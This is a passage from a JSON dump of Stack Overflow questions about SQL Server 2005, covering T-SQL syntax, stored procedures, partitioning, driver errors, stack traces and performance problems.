param3('{2}')\", \n     @param1, @param2, @param3)\n</code></pre>\n\n<p>the output should be redirected to the file on SQL Server \"C:\\output.txt\"</p>\n\n<p>is it possible using such a procedure with <strong><em>variable</em></strong> number of params and how?</p>\n\n<p>perhaps I could use</p>\n\n<pre><code>exec master..xp_cmdshell 'echo created &gt; c:\\output.txt'\nexec master..xp_cmdshell 'echo appended data &gt;&gt; c:\\output.txt'\nexec master..xp_cmdshell 'echo more data &gt;&gt; c:\\output.txt'\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2453,"score":2,"question_id":7932258,"title":"Insert multiple rows into table in SQL Server","body":"<p>I am using to using SQL Server. I'm trying to figure out how to insert multiple rows with one query. </p>\n\n<p>In MySQL the query would be like this:</p>\n\n<p>Code:</p>\n\n<pre><code>INSERT INTO Mytable (Name, Number) VALUES ('Joe', 18), ('Bob', 25), ('Mike', 7);\n</code></pre>\n\n<p>I tried a query like the one above in SQL Server and it gave me an error that said: </p>\n\n<blockquote>\n  <p>Incorrect syntax near ','.</p>\n</blockquote>\n\n<p>Is there a way to do this in SQL Server? </p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":123,"score":2,"question_id":10386591,"title":"How to create Job and Schedule in SQL Server 2005","body":"<p>My problem is that i have installed SQL Server 2005 on  my Computer. And I want to create job and schedule to set my Store Procedure work automatically. But the problem is that it require me to create SSIS first. Absolutely I CAN NOT configure it. And I wonder that can I configure it on my Computer(Not Window Server just Window 7)?  And this is my SQL Server Version:</p>\n\n<pre><code>  Microsoft SQL Server Management Studio               9.00.1399.00\n  Microsoft Analysis Services Client Tools             2005.090.1399.00\n  Microsoft Data Access Components (MDAC)              6.1.7601.17514(win7sp1_rtm.101119-1850)\n  Microsoft MSXML                                      3.0 4.0 5.0 6.0 \n  Microsoft Internet Explorer                          9.0.8112.16421\n  Microsoft .NET Framework                             2.0.50727.5448\n  Operating System                                     6.1.7601\n</code></pre>\n\n<p>Thank you in advance...</p>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":7988081,"title":"Alter SQL Server Partition Function?","body":"<p>I have created a Partition Function Based on DateTime DataType, below is the Script for Partition FUnction and its corresponding partition Scheme.</p>\n\n<pre><code>CREATE PARTITION FUNCTION [VZDArchiveDatePartition](datetime) AS RANGE LEFT FOR VALUES\n(N'2011-07-01T00:00:00.000', N'2011-08-01T00:00:00.000', N'2011-09-01T00:00:00.000',\n N'2011-10-01T00:00:00.000', N'2011-11-01T00:00:00.000', N'2011-12-01T00:00:00.000',\n N'2012-01-01T00:00:00.000', N'2012-02-01T00:00:00.000', N'2012-03-01T00:00:00.000',\n N'2012-04-01T00:00:00.000', N'2012-05-01T00:00:00.000', N'2012-06-01T00:00:00.000')\nGO\n\nCREATE PARTITION SCHEME [VZDArchivePartitionScheme] AS PARTITION [VZDArchiveDatePartition] TO\n([PRIMARY], [JulyFG], [AugFG], [SepFG], [OctFG], [NovFG], [DecFG], [Jan12FG],\n [Feb12FG], [Mar12FG], [Apr12FG], [May12FG], [Jun12FG])\nGO\n</code></pre>\n\n<p>In the above Partition FUnction , I have used 1 month as range value.Now I would like to alter the Partition range from Month to Quarter.\nPlease suggest how to alter the existing function which is assigned to multiple tables.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12498058,"title":"SQL Server: WHERE NOT EXISTS is not working","body":"<p>I have a table <code>Main1</code> which have 21 records and temp table  <code>@recordsToDel</code> have 20 records. \n20 Rows are identical in both tables but the following select query is not returning the missing record and delete is also not deleting it. Both table have similar columns.</p>\n\n<p>Any suggestions please?</p>\n\n<pre><code>SELECT * FROM dbo.Main1\nWHERE NOT EXISTS\n(\n    SELECT * FROM @recordsToDel\n);\n\nDELETE FROM dbo.Main1\nWHERE NOT EXISTS\n(\n    SELECT * FROM @recordsToDel\n);\n</code></pre>\n\n<p>Many Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":262,"score":3,"question_id":11669345,"title":"sql stored procedure argument as parameter for dynamic query","body":"<p>This procedure has three parameters. But when I try to execute by passing parameters it shows me an error. Please help me.</p>\n\n<pre><code>create procedure queryfunctions @Tabname varchar(150),@colname varchar(150),@valuesname varchar(150)\nas\nbegin\ndeclare @sql varchar(4000)\nselect @sql='select * from @Tabname where @colname=@valuesname'\nexec(@sql)\nend\n\nexec queryfunctions 'education','eduChildName','Revathi'\n</code></pre>\n\n<p><strong>Error :</strong> </p>\n\n<blockquote>\n  <p>Msg 1087, Level 15, State 2, Line 1\n          Must declare the table variable \"@Tabname\".</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005","reporting-services"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":1177206,"title":"Reporting services in Sqlserver","body":"<p>i know crystal reports very well and i work on this for last 3 years. \nI wanted to learn Reporting services of sqlserver so which is the best resource to learn the\nReporting services quickly ?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","unpivot"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":125,"score":1,"question_id":12501766,"title":"SQL query ; horizontal to vertical","body":"<p>I'm stuck with a SQL query (SQL Server) that involves converting horizontal rows to vertical rows</p>\n\n<p>Below is my data</p>\n\n<pre><code>No      Flag_1    Flag_2    Flag_3\n---      ----      -----     -----\nA         1         2         3\nB         4         1         6\n</code></pre>\n\n<p>After conversion , the table should be </p>\n\n<pre><code>No     FlagsName    Flag_value\n--      ----        ----------\nA        Flag_1        1\nA        Flag_2        2  \nA        Flag_3        3\nB        Flag_1        4\nB        Flag_2        1\nB        Flag_3        6\n</code></pre>\n\n<p>Any input on this would be helpful?</p>\n\n<p>I'm trying to play around <code>ROW_NUMBER</code> over partition. but it is not working somehow !!!</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":8,"favorite_count":2,"up_vote_count":16,"down_vote_count":0,"view_count":27606,"score":16,"question_id":1492411,"title":"SQL Server - SELECT FROM stored procedure","body":"<p>I have a stored procedure that returns rows:</p>\n\n<pre><code>CREATE PROCEDURE MyProc\nAS\nBEGIN\n    SELECT * FROM MyTable\nEND\n</code></pre>\n\n<p>My actual procedure is a little more complicated, which is why a sproc is necessary.</p>\n\n<p>Is it possible to select the output by calling this procedure?</p>\n\n<p>Something like:</p>\n\n<pre><code>SELECT * FROM (EXEC MyProc) AS TEMP\n</code></pre>\n\n<p>I need to use <code>SELECT TOP X</code>, <code>ROW_NUMBER</code>, and an additional <code>WHERE</code> clause to page my data, and I don't really want to pass these values as parameters.</p>\n"},{"tags":["java","sql-server-2005","tomcat6","outofmemoryerror","32bit"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":12498752,"title":"Java out of memory error when using MS SQL 2005 DB with Tomcat 6","body":"<p>I am working on a java based web app that uses Tomcat 6 as the web server. Normally, we have a MySQL backend, but for a few instances we need to use MS SQL to serve our clients. When performing our latest upgrade to one of these MS SQL instances, I began getting java out of memory errors when accessing certain pages of the web app. Usually occurring when returning a larger result set, but not always.</p>\n\n<p>I do not receive this error on the same web app set-up as a local instance on my PC, which leads me to believe that this is an environment issue. I have tried numerous different Java settings in the Tomcat 6 configuration without any luck fixing the issue. </p>\n\n<p>The environment is a 32-bit machine with 4GB of RAM. \nI have configured Tomcat 6 with the following:\n-XX:MaxPermSize=512m\n-Xnoclassgc\nInitial memory pool: 1024\nMaximum memory pool: 1024</p>\n\n<p>I have also tried increasing the MaxPermSize, but this causes Tomcat to not be able to start.</p>\n\n<p>As well, I have tried setting -Xms -Xmx, to 256m each, 512m each, etc.</p>\n\n<p>My local machine is 64-bit with 4GB RAM.\nI have configured Tomcat 6 with the following:\n-XX:MaxPermSize=512m\n-Xnoclassgc\nInitial memory pool: 1024\nMaximum memory pool: 1024</p>\n\n<p>Could this be an issue with an SQL statement in the new upgrade? \nI don't don't believe this is the case because the error does not happen on my local instance. I believe it's environment related, but can't figure out the issue.</p>\n\n<p>Does anyone have any advice?</p>\n\n<p>Here is the logged error: </p>\n\n<pre><code>2012-09-19 11:44:54,745 [ http-80-7] ERROR org.apache.jsp.siteManager.util.error_jsp: javax.servlet.ServletException: java.lang.OutOfMemoryError: unable to create new native thread\nat org.apache.jasper.runtime.PageContextImpl.doHandlePageException(PageContextImpl.java:862)\nat org.apache.jasper.runtime.PageContextImpl.handlePageException(PageContextImpl.java:791)\nat org.apache.jsp.doc.doc.index_jsp._jspService(index_jsp.java:1106)\nat org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\nat javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\nat org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\nat org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\nat org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\nat javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\nat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\nat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\nat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)\nat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:436)\nat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:374)\nat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:302)\nat com.djinnsoft.jade.sitetree.Sitetree.forward(Sitetree.java:405)\nat com.djinnsoft.jade.sitetree.Sitetree.forward(Sitetree.java:344)\nat com.djinnsoft.jade.sitetree.RootServlet.service(RootServlet.java:124)\nat javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\nat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\nat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\nat com.springboard.ram.report.ReportSecurityFilter.doFilter(ReportSecurityFilter.java:70)\nat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\nat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\nat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)\nat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)\nat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)\nat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)\nat org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555)\nat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)\nat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)\nat org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:861)\nat org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:579)\nat org.apache.tomcat.util.net.AprEndpoint$Worker.run(AprEndpoint.java:1584)\nat java.lang.Thread.run(Unknown Source)\nCaused by: java.lang.OutOfMemoryError: unable to create new native thread\nat java.lang.Thread.start0(Native Method)\nat java.lang.Thread.start(Unknown Source)\nat com.microsoft.sqlserver.jdbc.TimeoutTimer.start(Unknown Source)\nat com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement$StmtExecCmd.doExecute(Unknown Source)\nat com.microsoft.sqlserver.jdbc.TDSCommand.execute(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.executeQuery(Unknown Source)\nat org.apache.tomcat.dbcp.dbcp.DelegatingStatement.executeQuery(DelegatingStatement.java:208)\nat org.apache.tomcat.dbcp.dbcp.DelegatingStatement.executeQuery(DelegatingStatement.java:208)\nat com.djinnsoft.jade.data.record.SQLUtil.ExecuteQuery(SQLUtil.java:236)\nat com.djinnsoft.jade.data.record.SQLUtil.ExecuteQuery(SQLUtil.java:207)\nat com.djinnsoft.jade.data.record.RecordSource.find(RecordSource.java:184)\nat com.djinnsoft.jade.data.record.RecordSource.find(RecordSource.java:148)\nat com.djinnsoft.jade.content.data.DatabaseContentSource.createVersions(DatabaseContentSource.java:804)\nat com.djinnsoft.jade.content.data.DatabaseContentSource.access$2900(DatabaseContentSource.java:42)\nat com.djinnsoft.jade.content.data.DatabaseContentSource$8.process(DatabaseContentSource.java:747)\nat com.djinnsoft.jade.data.record.SQLEnvironment.execute(SQLEnvironment.java:70)\nat com.djinnsoft.jade.content.data.DatabaseContentSource.findImpl(DatabaseContentSource.java:672)\nat com.djinnsoft.jade.content.GenericContentSource.findImpl(GenericContentSource.java:1077)\nat com.djinnsoft.jade.content.GenericContentSource.find(GenericContentSource.java:1186)\nat com.djinnsoft.jade.content.GenericContentSource.find(GenericContentSource.java:1200)\nat com.djinnsoft.jade.content.GenericContentSource.find(GenericContentSource.java:1025)\nat com.djinnsoft.jade.content.taglib.ContentBaseTag.findItem(ContentBaseTag.java:166)\nat com.djinnsoft.jade.content.taglib.ContentTag.doStartTag(ContentTag.java:500)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_content_005faction_005f12(index_jsp.java:7637)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fforEach_005f6(index_jsp.java:6299)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fotherwise_005f3(index_jsp.java:4816)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fchoose_005f3(index_jsp.java:4395)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fotherwise_005f2(index_jsp.java:4363)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fchoose_005f2(index_jsp.java:4278)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_forms_005fpopulateResult_005f0(index_jsp.java:4244)\nat org.apache.jsp.doc.doc.index_jsp._jspService(index_jsp.java:961)\n... 32 more\n</code></pre>\n"},{"tags":["sql-server","visual-studio-2010","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":12465279,"title":"VS2010: Bad IL Range error","body":"<p>I'm attempting to connect to a database via the \"Add Connection\" in VS2010.  The database is running SQL2005, and is accessible in VS2008.   When I attempt to connect in VS2010 I receive the following error:<p></p>\n\n<blockquote>\nUnable to add data connection.<br>\nFailed to retrieve data for this request.<br>\nException has been thrown by the target of an invocation.<br>\nBad IL range.<br>\n</blockquote>\n\n<p>Oddly the \"Test connection\" works fine. <br>\nI've attempted to re-initialize VS2010 via the registry with no luck. Am looking for any suggestions as to the cause, or where I can look next, to find the root cause. <p>\nAdditional Info<br>\nI have noticed in the system event log 2 errors when I attempt to attach to a database: <br>\n1) The following fatal alert was generated: 48. The internal error state is 552.  and <br>\n2) The certificate received from the remote server was issued by an untrusted certificate authority. Because of this, none of the data contained in the certificate can be validated. The SSL connection request has failed. The attached data contains the server certificate.<p></p>\n\n<p>I've attempted to uninstall and re-install VS2010. No luck.  Attempting to connect on another machine seems to work, but my main development machine continues to fail with the error(s) noted above.   I'd prefer not to have to reformat my machine, and am desperate to find an answer or reasonable course of action to find the problem...  help!</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12500032,"title":"Nested If in stored proc causing syntax error","body":"<p>I am creating a stored proc, it queries the table \"Entries\". The proc has the parameters @ID, which is an int, and @APPROVED, which is a bit. I'm using SQL Server 2005</p>\n\n<p>If approved is false I want to do something different than if it is true. I have the following written. When I try to create it I get \"Incorrect syntax near the keyword 'END'.\".</p>\n\n<p>If I remove the nested if the error goes away however from what I've read this is perfectly valid syntax. Could anyone tell me where I am going wrong? </p>\n\n<pre><code>CREATE Procedure [dbo].[GetEntry](@ID int,@APPROVED bit)\nAS\nIF @APPROVED = 0\nBEGIN \n    --see if the unapproved entry has already been viewed \n    IF (SELECT COUNT(*) \n    FROM [dbo].[Entries]\n    WHERE EntryId = @ID AND Approved = @APPROVED AND Viewed = 0) &gt; 0\n    BEGIN\n\n    END\n\nEND\n</code></pre>\n\n<p>Any help would be really appreciated. Thanks! </p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2165,"score":3,"question_id":10304373,"title":"How convert string to date T-SQL?","body":"<p>For example I have string like this '24.04.2012', how I can convert to date type in T-SQL?</p>\n"},{"tags":["python","django","sql-server-2005","django-mssql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":160,"score":1,"question_id":10134822,"title":"When running syncdb on Django-mssql SQLInsertCompiler error","body":"<p>This is on Microsoft SQL Server 2005.\nPython 2.7.\nDjango 1.4</p>\n\n<p>Django-MSSQL is installed and connecting to the database.</p>\n\n<p>I can read tables, but not insert or update them. Working through django's tutorial on an empty database I get to this point:</p>\n\n<pre><code># Save the object into the database. You have to call save() explicitly.\n&gt;&gt;&gt; p.save()\n</code></pre>\n\n<p>After save() is called I get this <a href=\"http://code.google.com/p/django-mssql/issues/detail?id=119\" rel=\"nofollow\">error message</a> (which has also been reported):</p>\n\n<pre><code>Creating tables ...\nTraceback (most recent call last):\nFile \"manage.py\", line 11, in &lt;module&gt;\nexecute_manager(settings)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\__init__.py\", line 459, in execute_manager\nutility.execute()\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\__init__.py\", line 382, in execute\nself.fetch_command(subcommand).run_from_argv(self.argv)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\base.py\", line 196, in run_from_argv\nself.execute(*args, **options.__dict__)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\base.py\", line 232, in execute\noutput = self.handle(*args, **options)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\base.py\", line 371, in handle\nreturn self.handle_noargs(**options)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\commands\\syncdb.py\", line 110, in handle_noargs\nemit_post_sync_signal(created_models, verbosity, interactive, db)\nFile \"C:\\Python26\\lib\\site-packages\\django\\core\\management\\sql.py\", line 189, in emit_post_sync_signal\ninteractive=interactive, db=db)\nFile \"C:\\Python26\\lib\\site-packages\\django\\dispatch\\dispatcher.py\", line 172, in send\nresponse = receiver(signal=self, sender=sender, **named)\nFile \"C:\\Python26\\lib\\site-packages\\django\\contrib\\auth\\management\\__init__.py\", line 35, in create_permissions\nctype = ContentType.objects.get_for_model(klass)\nFile \"C:\\Python26\\lib\\site-packages\\django\\contrib\\contenttypes\\models.py\", line 42, in get_for_model\ndefaults = {'name': smart_unicode(opts.verbose_name_raw)},\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\manager.py\", line 134, in get_or_create\nreturn self.get_query_set().get_or_create(**kwargs)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\query.py\", line 449, in get_or_create\nobj.save(force_insert=True, using=self.db)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\base.py\", line 463, in save\nself.save_base(using=using, force_insert=force_insert, force_update=force_update)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\base.py\", line 551, in save_base\nresult = manager._insert([self], fields=fields, return_id=update_pk, using=using, raw=raw)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\manager.py\", line 203, in _insert\nreturn insert_query(self.model, objs, fields, **kwargs)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\query.py\", line 1576, in insert_query\nreturn query.get_compiler(using=using).execute_sql(return_id)\nFile \"C:\\Python26\\lib\\site-packages\\django\\db\\models\\sql\\compiler.py\", line 909, in execute_sql\nfor sql, params in self.as_sql():\nFile \"C:\\Python26\\lib\\site-packages\\django_mssql-1.0.1-py2.6.egg\\sqlserver_ado\\compiler.py\", line 207, in as_sql\nsql, params = super(SQLInsertCompiler, self).as_sql(*args, **kwargs)\nValueError: need more than 1 value to unpack\n</code></pre>\n\n<p><strong>UPDATE:</strong> I rolled back to Django 1.3 and this error went away. I suspect it is a change in how Django handles the users and authentication in 1.4. I'll take a look at source when I get a chance and try to patch.</p>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12497926,"title":"Pass parameter into subreport by clicking on textbox in SSRS 2005","body":"<p>I have a drill-down table in my master (parent) report and I want to make it so that when the user clicks on one of the rows, parameters are passed into the subreport and the subreport is re-generated.  How do I do this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12484739,"title":"SQL query stuck - comparison on different lines","body":"<p>I m working on a very weird problem with SQL where I have to compare previous rows</p>\n\n<pre><code>Number    start_date                      end_date    \n -----     -------                      ------------\n 1    2011-06-07 00:00:00.000         2011-07-10 00:00:00.000   \n 2    2011-10-11 00:00:00.000         2011-10-11 00:00:00.000   \n 3    2011-10-26 00:00:00.000         2011-10-29 00:00:00.000   \n 4    2011-10-29 00:00:00.000         2011-11-15 00:00:00.000   \n</code></pre>\n\n<p>Here , I have to compare the start_date and end_date on the two different line and create a view out of it.\n(If the start_date is less than the previous end_date , then criteria is set to 1).</p>\n\n<p>Well it should compare 2011-10-26 00:00:00.000 for 3 and 2011-10-27 00:00:00.000 on 2 for 30 days </p>\n\n<pre><code>Number    start_date                      end_date                 Criteria\n-----     -----------                   ----------------          ------------\n1   2011-06-07 00:00:00.000       2011-07-10 00:00:00.000            0\n2   2011-10-11 00:00:00.000       2011-10-11 00:00:00.000            0\n3   2011-10-26 00:00:00.000       2011-10-29 00:00:00.000            1\n4   2011-10-30 00:00:00.000       2011-11-15 00:00:00.000            1   \n</code></pre>\n\n<p>I m confused how should I proceed with this.</p>\n\n<p>Any help would be helpful !!!!</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["asp.net","sql-server-2005","asp.net-membership"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":322,"score":0,"question_id":11408650,"title":"add user and assign role in aspnet membership through sql servers SP","body":"<p>Tech - asp.net 3.5, Sql server 2005</p>\n\n<p>I have integrate aspnet membership for my webapplication.</p>\n\n<p>I am adding some users (member) from importing excel file.</p>\n\n<p>So how can I add that user and role of that user in aspnet membership tables?</p>\n\n<p>NOTE - I have SP which is used to add member in DB from uploaded excel file, I have wrote insert trriger on membertable.</p>\n"},{"tags":["sql-server-2005","tsql","sql-server-2008","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":4614,"score":8,"question_id":259803,"title":"T-SQL Stored Procedure Execution 'atomic'?","body":"<p>Let's say I have a simple stored procedure that looks like this (note: this is just an example, not a practical procedure):</p>\n\n<pre><code>CREATE PROCEDURE incrementCounter AS\n\nDECLARE @current int\nSET @current = (select CounterColumn from MyTable) + 1\n\nUPDATE\n    MyTable\nSET\n    CounterColumn = current\nGO\n</code></pre>\n\n<p>We're assuming I have a table called 'myTable' that contains one row, with the 'CounterColumn' containing our current count.</p>\n\n<p>Can this stored procedure be executed multiple times, at the same time?  </p>\n\n<p>i.e. is this possible:</p>\n\n<p>I call 'incrementCounter' twice.  Call A gets to the point where it sets the 'current' variable (let's say it is 5).  Call B gets to the point where it sets the 'current' variable (which would also be 5).  Call A finishes executing, then Call B finishes.  In the end, the table should contain the value of 6, but instead contains 5 due to the overlap of execution</p>\n"},{"tags":["sql-server","sql-server-2005","query-analyzer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12483064,"title":"Query runs fast in Query Analyzer but slow in C# application","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10175422/sql-runs-fast-in-ssms-slow-in-asp-net\">sql runs fast in ssms slow in asp.net</a>  </p>\n</blockquote>\n\n\n\n<p>Using SQL Server 2005, there is a sql query on a few big tables and it times out in the program. However, when I run it in Query Analyzer, it finishes in about 30 seconds.</p>\n\n<p>Why the difference?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12482820,"title":"update table with join but with summed values","body":"<p>I've got 2 tables:</p>\n\n<pre><code>-Card\nid\npoints\n\n-History\nCardId\npoints\n</code></pre>\n\n<p>Now I would like to perform update query which subtracts points in Card table based on points in History with the same cardId</p>\n\n<p>for example I have rows:</p>\n\n<pre><code>-card\n1 10\n2 30\n\n-History\n1 5\n1 3\n2 10 \n2 9\n</code></pre>\n\n<p>and as a result I should have in Card table rows:</p>\n\n<pre><code>-card\n1 2\n2 11\n</code></pre>\n\n<p>what is the best way to do that?</p>\n"},{"tags":["sql-server","sql-server-2005","isolation-level","read-committed-snapshot","optimistic-concurrency"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2179,"score":1,"question_id":2778199,"title":"How to figure the read/write ratio in Sql Server?","body":"<p>How can I query the read/write ratio in Sql Server 2005?  Are there any caveats I should be aware of?</p>\n\n<p>Perhaps it can be found in a DMV query, a standard report, a custom report (i.e the Performance Dashboard), or examining a Sql Profiler trace. I'm not sure exactly.</p>\n\n<p><strong>Why do I care?</strong></p>\n\n<p>I'm taking time to improve the performance of my web app's data layer. It deals with millions of records and thousands of users.  </p>\n\n<p>One of the points I'm examining is database concurrency.  Sql Server uses pessimistic concurrency by default--good for a write-heavy app.  If my app is read-heavy, I might switch it to optimistic concurrency (isolation level: <code>read committed snapshot</code>) like <a href=\"http://www.codinghorror.com/blog/2008/08/deadlocked.html\" rel=\"nofollow\">Jeff Atwood did with StackOverflow</a>.</p>\n"},{"tags":["sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":3969,"score":2,"question_id":4657642,"title":"How to get last inserted row in sql server","body":"<p>How can i get Last inserted row when in table there is no <code>Uniqueidentifier or identity</code> column. </p>\n\n<p>I am waiting of your good idea's. </p>\n"},{"tags":["php","sql-server-2005","character-encoding"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":182,"score":2,"question_id":8170653,"title":"Retrieve Greek letters from MSSQL database with PHP","body":"<p>I've done this before in .Net but I am somewhat new to PHP and could use some help.  I'm trying to pull data in PHP from a MSSQL db, some of which is Greek letters.  The data type of the MSSQL columns is <code>nvarchar</code> and the Greek characters are displayed correctly in management studio; however, whenever I pull the data with the <code>sqlsrv_query</code> function in php I get a bunch of question marks.</p>\n\n<p>In <code>sqlsrv_connect</code> function I've tried setting <code>CharacterSet\"=&gt;\"UTF-8</code> which doesn't work.<br>\nI've tried <code>iconv()</code>, but am not sure which sets to use.<br>\nI tried <code>mb_detect_encoding()</code> and it returned <code>ASCIIASCII</code>.  </p>\n\n<p>Here is some sample code:</p>\n\n<pre><code>public function _getOrderItemDetails($orderItemIds,$productTypeId){\n    $params = explode(',', $orderItemIds);\n\n    $sql = \"select od.*, ofs.Sort\n            from orderDetail od\n                left join orderFieldSort ofs on ofs.fieldName = od.name and productTypeId in ($productTypeId)\n            where orderItemid in (\".rtrim(str_repeat('?,', count($params)),',').\")\n            order by ofs.sort\";\n\n   return $this-&gt;_compileResults($sql,'OrderDetail',$params);;\n}\n\nprivate function _compileResults($sql,$classType,$params ){       \n    $result = sqlsrv_query($this-&gt;conn,$sql,$params);\n\n    $arrayResult = array();\n    while($orderObject = sqlsrv_fetch_object($result,$classType)){\n        array_push($arrayResult, $orderObject);\n    }\n    return $arrayResult;\n}\n</code></pre>\n\n<p>Any suggestions are welcome. Please help!</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","count"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":12479677,"title":"SQL Server Count is slow","body":"<p>Counting tables with large amount of data may be very slow, sometimes it takes minutes; it also may generate deadlock on a busy server. I want to display real values, NOLOCK is not an option.</p>\n\n<p>The servers I use is SQL Server 2005 or 2008 Standard or Enterprise - if it matters.\nI can imagine that SQL Server maintains the counts for every table and if there is no WHERE clause I could get that number pretty quickly, right?</p>\n\n<p>For example:</p>\n\n<pre><code>SELECT COUNT(*) FROM myTable\n</code></pre>\n\n<p>should immediately return with the correct value. Do I need to rely on statistics to be updated?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","global-variables"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":7390,"score":3,"question_id":1838429,"title":"Create a global static variable in SQL Server?","body":"<p>Is there a way to create a global variable in SQL Server, in such a way that it persists even if 